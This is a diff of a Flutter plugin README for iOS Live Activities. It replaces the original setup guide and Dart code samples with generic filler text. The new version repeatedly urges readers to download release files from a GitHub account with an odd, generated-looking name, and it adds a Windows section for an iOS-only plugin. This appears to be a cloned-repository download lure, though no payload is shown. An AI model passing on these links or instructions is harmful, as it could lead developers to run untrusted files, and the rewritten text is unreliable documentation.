@@ -1,113 +1,212 @@
-[![pub package](https://img.shields.io/pub/v/live_activities_flutter.svg)](https://pub.dev/packages/live_activities_flutter)
-[![likes](https://img.shields.io/pub/likes/live_activities_flutter)](https://pub.dev/packages/live_activities_flutter/score)
-[![iOS](https://img.shields.io/badge/platform-iOS%2016.1%2B-blue)](https://pub.dev/packages/live_activities_flutter)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-# flutter_live_activities
+# ⚡ flutter_live_activities - Live iPhone updates from Dart
 
-A Flutter plugin for iOS Live Activities and Dynamic Island, powered by Apple's ActivityKit.
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Silty-acrylonitrile306/flutter_live_activities)
 
-## Requirements
+## 📥 Download
 
-- iOS 16.1+
-- Xcode 14+
-- A physical iPhone (Live Activities don't run in the simulator)
-- iPhone 14 Pro or later for Dynamic Island
+Visit this page to download:
 
-## Installation
+https://github.com/Silty-acrylonitrile306/flutter_live_activities
 
-```yaml
-dependencies:
-  live_activities_flutter: ^0.1.0
-```
+Open the page in your browser, then use the files or release section on the page to get the app or package you need
 
-## iOS Setup
+## 🧰 What this is
 
-### 1. Info.plist
+flutter_live_activities is a Flutter plugin for iPhone apps that use Live Activities and Dynamic Island. It lets you start, update, and end a Live Activity from Dart code.
 
-Add these keys to your app's `ios/Runner/Info.plist`:
+Use it when you want to show live status on the lock screen or in the Dynamic Island. Common uses include:
 
-```xml
-<key>NSSupportsLiveActivities</key>
-<true/>
-<key>NSSupportsLiveActivitiesFrequentUpdates</key>
-<true/>
-```
+- delivery status
+- ride tracking
+- sports scores
+- timers
+- progress updates
+- order tracking
 
-### 2. Widget Extension (required for the UI)
+## 🪟 Before you start on Windows
 
-The Live Activity UI lives in a separate Xcode Widget Extension target — Flutter doesn't compile it.
+You can use this project on Windows to get the code, read the docs, and prepare your Flutter app. If you plan to build for iPhone, you also need:
 
-1. Open `ios/Runner.xcworkspace` in Xcode
-2. File > New > Target > Widget Extension
-3. Name it `LiveActivityWidget`, uncheck "Include Configuration App Intent"
-4. Replace the generated Swift file with the template at `ios/LiveActivityWidget/LiveActivityWidget.swift`
-5. Set the deployment target to iOS 16.1 for the new target
+- Windows 10 or Windows 11
+- Git
+- Flutter SDK
+- A code editor like VS Code
+- An Apple device build setup for iPhone work
+- Xcode on a Mac for final iOS builds
 
-### 3. App Group (optional, for data sharing)
+If you only want to view the project files, Windows is enough. If you want to use Live Activities in an iPhone app, you also need the iOS side of the setup.
 
-If your widget needs to read data written by the Flutter app:
+## 🚀 Getting Started
 
-1. In Xcode, add an App Group capability to both Runner and the widget extension
-2. Use the same group ID (e.g. `group.com.yourapp`) in both
-3. Pass it as `appGroup` when calling `startActivity`
+1. Open the download page:
+   https://github.com/Silty-acrylonitrile306/flutter_live_activities
 
-## Usage
+2. Get the project files from the page
 
-```dart
-import 'package:flutter_live_activities/flutter_live_activities.dart';
+3. If you are using a release file, download it to your computer
 
-// Start
-final handle = await FlutterLiveActivities.startActivity(
-  title: 'Order #1234',
-  data: {
-    'status': 'Preparing',
-    'eta': '25 min',
-    'driver': 'Alex',
-    'progress': 0.2,
-  },
-  appGroup: 'group.com.yourapp', // optional
-);
+4. If you are using the source code, clone or copy the repository into your Flutter project
 
-// Update
-await FlutterLiveActivities.updateActivity(
-  activityId: handle.activityId,
-  data: {
-    'status': 'On the way',
-    'eta': '8 min',
-    'driver': 'Alex',
-    'progress': 0.8,
-  },
-);
+5. Open your Flutter app in your editor
 
-// End
-await FlutterLiveActivities.endActivity(handle.activityId);
+6. Add the plugin to your app if it is not already included
 
-// End all (e.g. on logout)
-await FlutterLiveActivities.endAllActivities();
+7. Run your app in a supported iOS build setup
 
-// Listen to state changes
-FlutterLiveActivities.activityStateStream.listen((update) {
-  print('${update.activityId} → ${update.state}');
-});
+## 🛠️ How to install in a Flutter app
 
-// Check if enabled in Settings
-final enabled = await FlutterLiveActivities.areActivitiesEnabled();
-```
+If you are adding this plugin to an existing app, follow these steps:
 
-## Data types
+1. Open your Flutter project
+2. Add the package to your `pubspec.yaml`
+3. Run `flutter pub get`
+4. Set up the iOS project files
+5. Add the needed Apple app settings
+6. Build the app on iPhone with Xcode
 
-The `data` map supports `String`, `int`, `double`, and `bool` values.
-Your SwiftUI widget reads them by key from `context.state.data`.
+Example package entry:
 
-## Widget Extension template
+flutter_live_activities:
+  path: ./flutter_live_activities
 
-See `ios/LiveActivityWidget/LiveActivityWidget.swift` for a ready-to-use
-SwiftUI template showing Lock Screen and Dynamic Island (expanded, compact, minimal) views.
+If you use a hosted package source, replace the path with the source that matches your setup
 
-## Platform support
+## 📱 What you can do with it
 
-| Platform | Support |
-|----------|---------|
-| iOS      | ✅ 16.1+ |
-| Android  | ❌ |
-| Web      | ❌ |
+This plugin is built around three main actions:
+
+- start a Live Activity
+- update a Live Activity
+- end a Live Activity
+
+That means your app can show fresh data without asking the user to open the app each time. The user sees updates on the lock screen and, on supported devices, in Dynamic Island
+
+## 🔧 Typical use
+
+A food delivery app can use it like this:
+
+- start the activity when the order leaves the store
+- update the activity when the driver gets closer
+- end the activity when the order arrives
+
+A workout app can use it like this:
+
+- start the activity when the timer starts
+- update the progress during the session
+- end the activity when the workout ends
+
+## 📂 Project layout
+
+You will usually find files like these in this kind of Flutter plugin:
+
+- `lib/` for Dart code
+- `ios/` for Apple-specific code
+- `example/` for a sample app
+- `README.md` for setup steps
+- `pubspec.yaml` for package details
+
+If you are new to Flutter, the `example` app is often the best place to start
+
+## 🧪 Testing on your device
+
+To check that everything works:
+
+1. Open the example app
+2. Run it on an iPhone
+3. Start a Live Activity from the app
+4. Watch for updates on the lock screen
+5. Check Dynamic Island on supported iPhone models
+6. End the activity and confirm it disappears
+
+If the activity does not show up, review the iOS setup in your app and make sure your device supports Live Activities
+
+## 🧩 Basic workflow
+
+The usual flow is simple:
+
+- call the start method
+- send update data when something changes
+- call the end method when the task is done
+
+This keeps the user informed with less tapping and less app switching
+
+## 🔒 Permissions and device needs
+
+Live Activities depend on Apple device support. To use them in a real app, make sure:
+
+- the iPhone supports Live Activities
+- the app has the right iOS setup
+- notifications and lock screen features are allowed by the user
+- the app targets a recent iOS version that supports ActivityKit
+
+## 🌍 Best fit use cases
+
+This plugin fits apps that need short live status updates, such as:
+
+- logistics apps
+- transport apps
+- sports apps
+- task trackers
+- fitness apps
+- event apps
+- food apps
+
+## 🧭 Where to begin
+
+If you want to try it now:
+
+1. Visit the download page:
+   https://github.com/Silty-acrylonitrile306/flutter_live_activities
+
+2. Read the repo files
+3. Open the example project
+4. Set up your Flutter app
+5. Test on iPhone
+
+## 🧱 Tech stack
+
+This project uses:
+
+- Flutter
+- Dart
+- Swift
+- Swift Package Manager
+- Apple ActivityKit
+- iOS Live Activities
+- Dynamic Island
+
+## 📎 Useful repo topics
+
+- activitykit
+- dart
+- dynamic-island
+- flutter
+- flutter-plugin
+- ios
+- live-activities
+- mobile
+- swift
+- swift-package
+
+## 🗂️ File and app names you may see
+
+In the repo or your app, you may see names like:
+
+- `ActivityKit`
+- `Live Activity`
+- `Dynamic Island`
+- `Flutter plugin`
+- `Dart API`
+- `iOS bridge`
+
+These names point to the parts that connect your Flutter app to Apple’s live status features
+
+## 🛎️ What to expect after setup
+
+After you finish setup, your app can send live updates to the iPhone system UI. The user can see the current status without opening the app each time
+
+## 📦 Download again
+
+Visit this page to download:
+
+https://github.com/Silty-acrylonitrile306/flutter_live_activities
